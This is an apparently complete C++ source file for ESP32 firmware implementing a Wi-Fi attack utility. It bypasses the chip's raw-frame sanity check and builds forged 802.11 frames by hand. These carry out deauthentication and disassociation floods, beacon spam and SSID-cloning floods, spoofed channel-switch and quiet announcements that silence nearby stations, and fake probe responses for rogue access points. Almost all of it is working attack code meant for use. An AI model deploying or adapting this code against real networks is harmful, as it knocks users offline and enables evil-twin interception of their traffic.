#include "utils/network/WifiAttackUtil.h"
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337) return 1;
  return 0;
}

WifiAttackUtil::WifiAttackUtil(bool initAP)
{
  WiFi.mode(WIFI_MODE_APSTA);
  if (initAP) {
    WiFi.softAP("No Internet", "12345678", 1, true);
  }
}

WifiAttackUtil::~WifiAttackUtil()
{
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  _sequenceNumber = 0;
}

esp_err_t WifiAttackUtil::setChannel(uint8_t channel)
{
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t WifiAttackUtil::_changeChannel(const uint8_t channel) noexcept
{
  if (channel == _currentChannel) return ESP_OK;
  _currentChannel = channel;
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t WifiAttackUtil::_sendPacket(const uint8_t* packet, const size_t len) noexcept
{
  return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
}

esp_err_t WifiAttackUtil::deauthenticate(const MacAddr bssid, const uint8_t channel)
{
  const MacAddr broadcast = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  return deauthenticate(broadcast, bssid, channel);
}

esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel, const bool wpa2, const uint8_t* srcMac)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  const size_t ssidLen = strnlen(ssid, 32);

  // Stable BSSID if provided, else randomize — force unicast (bit 0 = 0) +
  // locally administered (bit 1 = 1).
  uint8_t mac[6];
  if (srcMac) {
    memcpy(mac, srcMac, 6);
  } else {
    for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(0, 256);
    mac[0] = (mac[0] & 0xFE) | 0x02;
  }

  // Build beacon frame dynamically so SSID IE length matches actual SSID length
  // and all subsequent IE offsets are correct regardless of SSID length.
  uint8_t pkt[109];  // sized for max SSID (32 bytes)
  size_t  n = 0;

  // MAC header
  pkt[n++] = 0x80; pkt[n++] = 0x00;                    // Frame Control: beacon
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Duration
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;  // DA: broadcast
  memcpy(&pkt[n], mac, 6); n += 6;                      // SA
  memcpy(&pkt[n], mac, 6); n += 6;                      // BSSID
  const size_t seqOff = n;
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Sequence Control (per send)

  // Fixed parameters
  memset(&pkt[n], 0, 8); n += 8;                        // Timestamp: 0
  pkt[n++] = 0xE8; pkt[n++] = 0x03;                    // Beacon interval
  // Capability: privacy bit (0x10) set only for the WPA2 variant.
  pkt[n++] = wpa2 ? 0x31 : 0x21; pkt[n++] = 0x00;

  // SSID IE — length = actual SSID byte count
  pkt[n++] = 0x00;
  pkt[n++] = (uint8_t)ssidLen;
  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;

  // Supported Rates IE
  pkt[n++] = 0x01; pkt[n++] = 0x08;
  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;

  // DS Parameter Set IE
  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel;

  // RSN IE (WPA2-PSK / CCMP) — only for the secured variant.
  if (wpa2) {
    pkt[n++] = 0x30; pkt[n++] = 0x18;
    pkt[n++] = 0x01; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
    pkt[n++] = 0x02; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
    pkt[n++] = 0x01; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
    pkt[n++] = 0x00; pkt[n++] = 0x00;
  }

  for (int k = 0; k < 3; k++) {
    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
    _sequenceNumber++;
    _sendPacket(pkt, n);
    vTaskDelay(1 / portTICK_RATE_MS);
  }

  return ESP_OK;
}

// Shared beacon scaffold for the 802.11h element attacks: MAC header spoofing
// `bssid`, fixed params, SSID / Rates / DS IEs. Returns bytes written and the
// sequence-control offset (patched per send). The caller appends its element.
static size_t _buildBeaconPrefix(uint8_t* pkt, const uint8_t* bssid,
                                 const char* ssid, size_t ssidLen,
                                 uint8_t channel, size_t& seqOff)
{
  size_t n = 0;
  pkt[n++] = 0x80; pkt[n++] = 0x00;                    // Frame Control: beacon
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Duration
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;   // DA: broadcast
  memcpy(&pkt[n], bssid, 6); n += 6;                    // SA = target BSSID
  memcpy(&pkt[n], bssid, 6); n += 6;                    // BSSID = target BSSID
  seqOff = n;
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Sequence Control (per send)

  memset(&pkt[n], 0, 8); n += 8;                        // Timestamp
  pkt[n++] = 0xE8; pkt[n++] = 0x03;                    // Beacon interval
  pkt[n++] = 0x31; pkt[n++] = 0x00;                    // Capability (privacy like a real AP)

  pkt[n++] = 0x00; pkt[n++] = (uint8_t)ssidLen;        // SSID IE
  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;

  pkt[n++] = 0x01; pkt[n++] = 0x08;                    // Supported Rates IE
  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;

  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel; // DS Parameter Set IE
  return n;
}

esp_err_t WifiAttackUtil::channelSwitch(const MacAddr bssid, const char* ssid,
                                        const uint8_t channel, const uint8_t newChannel,
                                        const uint8_t switchCount)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  const size_t ssidLen = strnlen(ssid, 32);
  uint8_t pkt[128];
  size_t  seqOff = 0;
  size_t  n = _buildBeaconPrefix(pkt, bssid, ssid, ssidLen, channel, seqOff);

  // Channel Switch Announcement IE (element 37): mode, new channel, count.
  // mode = 1 → stations stop transmitting until the switch completes.
  pkt[n++] = 0x25; pkt[n++] = 0x03;
  pkt[n++] = 0x01; pkt[n++] = newChannel; pkt[n++] = switchCount;

  for (int k = 0; k < 3; k++) {
    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
    _sequenceNumber++;
    _sendPacket(pkt, n);
    vTaskDelay(1 / portTICK_RATE_MS);
  }
  return ESP_OK;
}

esp_err_t WifiAttackUtil::channelSwitchUnicast(const MacAddr client, const MacAddr bssid,
                                               const uint8_t channel, const uint8_t newChannel,
                                               const uint8_t switchCount)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  uint8_t pkt[32];
  size_t  n = 0;
  pkt[n++] = 0xD0; pkt[n++] = 0x00;                    // Frame Control: Action
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Duration
  memcpy(&pkt[n], client, 6); n += 6;                  // addr1 = DA = target client
  memcpy(&pkt[n], bssid,  6); n += 6;                  // addr2 = SA = AP BSSID
  memcpy(&pkt[n], bssid,  6); n += 6;                  // addr3 = BSSID
  const size_t seqOff = n;
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Sequence Control (per send)

  // Action body: Spectrum Management (cat 0), Channel Switch Announcement (4).
  pkt[n++] = 0x00; pkt[n++] = 0x04;
  // Channel Switch Announcement element: mode, new channel, count.
  pkt[n++] = 0x25; pkt[n++] = 0x03;
  pkt[n++] = 0x01; pkt[n++] = newChannel; pkt[n++] = switchCount;

  for (int k = 0; k < 3; k++) {
    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
    _sequenceNumber++;
    _sendPacket(pkt, n);
    vTaskDelay(1 / portTICK_RATE_MS);
  }
  return ESP_OK;
}

esp_err_t WifiAttackUtil::quiet(const MacAddr bssid, const char* ssid,
                                const uint8_t channel, const uint8_t count,
                                const uint8_t period, const uint16_t duration,
                                const uint16_t offset)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  const size_t ssidLen = strnlen(ssid, 32);
  uint8_t pkt[128];
  size_t  seqOff = 0;
  size_t  n = _buildBeaconPrefix(pkt, bssid, ssid, ssidLen, channel, seqOff);

  // Quiet IE (element 40): count, period, duration (TU, LE), offset (TU, LE).
  pkt[n++] = 0x28; pkt[n++] = 0x06;
  pkt[n++] = count; pkt[n++] = period;
  pkt[n++] = (uint8_t)(duration & 0xFF); pkt[n++] = (uint8_t)(duration >> 8);
  pkt[n++] = (uint8_t)(offset & 0xFF);   pkt[n++] = (uint8_t)(offset >> 8);

  for (int k = 0; k < 3; k++) {
    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
    _sequenceNumber++;
    _sendPacket(pkt, n);
    vTaskDelay(1 / portTICK_RATE_MS);
  }
  return ESP_OK;
}

esp_err_t WifiAttackUtil::beaconFlood(const uint8_t* bssid, const char* ssid, const uint8_t channel)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  const size_t ssidLen = strnlen(ssid, 32);

  // Flood = many visible copies of the TARGET SSID. Each beacon must carry its
  // own BSSID, otherwise (reusing the real AP's BSSID) every frame just merges
  // into the existing network and no new AP ever appears in the victim's scan.
  // Randomise a locally-administered unicast MAC per call (the passed `bssid` is
  // only the scan match — its SSID/channel are what we clone).
  (void)bssid;
  uint8_t mac[6];
  for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(0, 256);
  mac[0] = (mac[0] & 0xFE) | 0x02;

  uint8_t pkt[109];
  size_t  n = 0;

  pkt[n++] = 0x80; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x00;
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
  memcpy(&pkt[n], mac, 6); n += 6;
  memcpy(&pkt[n], mac, 6); n += 6;
  const size_t seqOff = n;
  pkt[n++] = 0x00; pkt[n++] = 0x00;

  memset(&pkt[n], 0, 8); n += 8;
  pkt[n++] = 0xE8; pkt[n++] = 0x03;
  pkt[n++] = 0x31; pkt[n++] = 0x00;

  pkt[n++] = 0x00;
  pkt[n++] = (uint8_t)ssidLen;
  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;

  pkt[n++] = 0x01; pkt[n++] = 0x08;
  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;

  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel;

  pkt[n++] = 0x30; pkt[n++] = 0x18;
  pkt[n++] = 0x01; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
  pkt[n++] = 0x02; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
  pkt[n++] = 0x01; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
  pkt[n++] = 0x00; pkt[n++] = 0x00;

  uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
  pkt[seqOff]     = (uint8_t)(sc & 0xFF);
  pkt[seqOff + 1] = (uint8_t)(sc >> 8);
  _sequenceNumber++;
  return _sendPacket(pkt, n);
}

esp_err_t WifiAttackUtil::probeResponse(const char* ssid, const MacAddr dst, const uint8_t channel, const bool wpa2, const uint8_t* srcMac)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  const size_t ssidLen = strnlen(ssid, 32);

  // Stable fake-AP BSSID if provided, else randomized locally-administered MAC.
  uint8_t mac[6];
  if (srcMac) {
    memcpy(mac, srcMac, 6);
  } else {
    for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(0, 256);
    mac[0] = (mac[0] & 0xFE) | 0x02;
  }

  uint8_t pkt[128];
  size_t  n = 0;

  // MAC header — Probe Response (subtype 0x5) directed at the client
  pkt[n++] = 0x50; pkt[n++] = 0x00;                    // Frame Control
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Duration
  memcpy(&pkt[n], dst, 6); n += 6;                      // DA: probing client
  memcpy(&pkt[n], mac, 6); n += 6;                      // SA
  memcpy(&pkt[n], mac, 6); n += 6;                      // BSSID
  const size_t seqOff = n;
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Sequence Control (per send)

  // Fixed parameters
  memset(&pkt[n], 0, 8); n += 8;                        // Timestamp
  pkt[n++] = 0x64; pkt[n++] = 0x00;                    // Beacon interval
  pkt[n++] = wpa2 ? 0x31 : 0x21; pkt[n++] = 0x00;      // Capability (privacy if WPA2)

  // SSID IE
  pkt[n++] = 0x00;
  pkt[n++] = (uint8_t)ssidLen;
  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;

  // Supported Rates IE
  pkt[n++] = 0x01; pkt[n++] = 0x08;
  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;

  // DS Parameter Set IE
  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel;

  // RSN IE (WPA2-PSK / CCMP) — only for the secured variant.
  if (wpa2) {
    pkt[n++] = 0x30; pkt[n++] = 0x18;
    pkt[n++] = 0x01; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
    pkt[n++] = 0x02; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
    pkt[n++] = 0x01; pkt[n++] = 0x00;
    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
    pkt[n++] = 0x00; pkt[n++] = 0x00;
  }

  for (int k = 0; k < 2; k++) {
    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
    _sequenceNumber++;
    _sendPacket(pkt, n);
    vTaskDelay(1 / portTICK_RATE_MS);
  }

  return ESP_OK;
}

esp_err_t WifiAttackUtil::deauthenticate(const MacAddr ap, const MacAddr bssid, const uint8_t channel)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  memcpy(_deauthFrame, _deauthDefault, sizeof(_deauthDefault));
  memcpy(&_deauthFrame[4],  ap,    6);
  memcpy(&_deauthFrame[10], bssid, 6);
  memcpy(&_deauthFrame[16], bssid, 6);

  // Send multiple deauth + disassoc frames for effectiveness
  // Some devices (especially phones) ignore single broadcast deauth
  for (int i = 0; i < 3; i++) {
    memcpy(&_deauthFrame[22], &_sequenceNumber, 2);
    _sequenceNumber++;
    _deauthFrame[0] = 0xc0;  // deauth
    _sendPacket(_deauthFrame, sizeof(_deauthFrame));
    _deauthFrame[0] = 0xa0;  // disassoc
    _sendPacket(_deauthFrame, sizeof(_deauthFrame));
    vTaskDelay(1 / portTICK_PERIOD_MS);
  }

  return ESP_OK;
}